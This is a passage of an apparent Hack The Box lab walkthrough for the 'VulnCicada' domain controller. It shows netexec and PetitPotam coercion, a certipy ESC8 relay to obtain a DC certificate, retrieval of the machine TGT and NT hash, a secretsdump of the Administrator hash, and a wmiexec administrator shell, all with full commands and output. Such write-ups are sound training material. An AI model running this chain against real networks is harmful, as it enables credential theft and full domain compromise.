+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl  <span class="nt">-u</span> Rosie.Powell <span class="nt">-p</span> Cicada123 <span class="nt">-k</span> <span class="nt">-M</span> coerce_plus 
+<span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logsuccess">[+]</span><span class="go"> cicada.vl\Rosie.Powell:Cicada123 
+COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, DFSCoerce
+COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
+COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
+COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
+</span></code></pre></div></div>
+<p>In theory any of these should work. I have the best luck with PetitPotam. To trigger it, I’ll give <code class="language-plaintext highlighter-rouge">netexec</code> the <code class="language-plaintext highlighter-rouge">LISTENER</code> of the malicious DNS record, and the <code class="language-plaintext highlighter-rouge">METHOD</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl  <span class="nt">-u</span> Rosie.Powell <span class="nt">-p</span> Cicada123 <span class="nt">-k</span> <span class="nt">-M</span> coerce_plus <span class="nt">-o</span> <span class="nv">LISTENER</span><span class="o">=</span>DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <span class="nv">METHOD</span><span class="o">=</span>PetitPotam
+<span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="netexec-protocol">SMB </span><span class="go">        DC-JPQ225.cicada.vl 445    DC-JPQ225        </span><span class="netexec-logsuccess">[+]</span><span class="go"> cicada.vl\Rosie.Powell:Cicada123 
+COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
+COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
+</span></code></pre></div></div>
+<p>At the relay, there’s a connection, and it eventually creates a <code class="language-plaintext highlighter-rouge">.pfx</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy relay <span class="nt">-target</span> <span class="s1">'http://dc-jpq225.cicada.vl/'</span> <span class="nt">-template</span> DomainController
+<span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
+[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
+[*] Listening on 0.0.0.0:445
+[*] Setting up SMB Server on port 445
+[*] SMBD-Thread-2 (process_request_thread): Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
+[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
+[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
+[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
+[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
+[*] Authenticating against http://dc-jpq225.cicada.vl as / SUCCEED
+[*] Requesting certificate for '\\' based on the template 'DomainController'
+[*] HTTP Request: POST http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
+[*] Certificate issued with request ID 95
+[*] Retrieving certificate for request ID: 95
+[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certnew.cer?ReqID=95 "HTTP/1.1 200 OK"
+[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
+[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
+[*] Saving certificate and private key to 'dc-jpq225.pfx'
+[*] Wrote certificate and private key to 'dc-jpq225.pfx'
+[*] Exiting...
+</span></code></pre></div></div>
+<p>With the certificate I can authenticate as the computer account:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>certipy auth <span class="nt">-pfx</span> dc-jpq225.pfx <span class="nt">-dc-ip</span> 10.129.234.48
+<span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
+[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
+[*] Using principal: 'dc-jpq225$@cicada.vl'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'dc-jpq225.ccache'
+[*] Wrote credential cache to 'dc-jpq225.ccache'
+[*] Trying to retrieve NT hash for 'dc-jpq225$'
+[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
+</span></code></pre></div></div>
+<p>This returns both a TGT and the NTLM for the account.</p>
+<h2 id="shell-as-administrator">Shell as Administrator</h2>
+<h3 id="dump-hashes">Dump Hashes</h3>
+<p>The machine account cannot get a shell directly, but this TGT can be used to dump hashes from the DC:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>dc-jpq225.ccache secretsdump.py <span class="nt">-k</span> <span class="nt">-no-pass</span> cicada.vl/dc-jpq225<span class="se">\$</span>@dc-jpq225.cicada.vl <span class="nt">-just-dc-user</span> administrator
+<span class="go">/home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+  import pkg_resources
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
+Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
+Administrator:des-cbc-md5:fd2a29621f3e7604
+[*] Cleaning up... 
+</span></code></pre></div></div>
+<p>The hash is valid:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc-jpq225.cicada.vl <span class="nt">-u</span> administrator <span class="nt">-H</span> 85a0da53871a9d56b6cd05deda3a5e87 <span class="nt">-k</span>
+<span class="netexec-protocol">SMB </span><span class="go">        dc-jpq225.cicada.vl 445    dc-jpq225        </span><span class="netexec-logmessage">[*]</span><span class="go">  x64 (name:dc-jpq225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go">
+</span><span class="netexec-protocol">SMB </span><span class="go">        dc-jpq225.cicada.vl 445    dc-jpq225        </span><span class="netexec-logsuccess">[+]</span><span class="go"> cicada.vl\administrator:85a0da53871a9d56b6cd05deda3a5e87 </span><span class="netexec-pwned">(Pwn3d!)</span><span class="go">
+</span></code></pre></div></div>
+<h3 id="shell">Shell</h3>
+<p>A quick way to get a shell from here is <code class="language-plaintext highlighter-rouge">wmiexec</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wmiexec.py cicada.vl/administrator@dc-jpq225.cicada.vl <span class="nt">-k</span> <span class="nt">-hashes</span> :85a0da53871a9d56b6cd05deda3a5e87
+<span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] SMBv3.0 dialect used
+[-] CCache file is not found. Skipping...
+[-] CCache file is not found. Skipping...
+[-] CCache file is not found. Skipping...
+[-] CCache file is not found. Skipping...
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;whoami
+cicada\administrator
+</span></code></pre></div></div>
+<p>And grab the flags:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\users\administrator\desktop&gt;</span><span class="nb">type </span>user.txt
+<span class="go">c6a8fc2e************************
+</span><span class="gp">C:\users\administrator\desktop&gt;</span><span class="nb">type </span>root.txt
+<span class="go">65d0019f************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/07/03/htb-vulncicada.html"></a>
+</article>
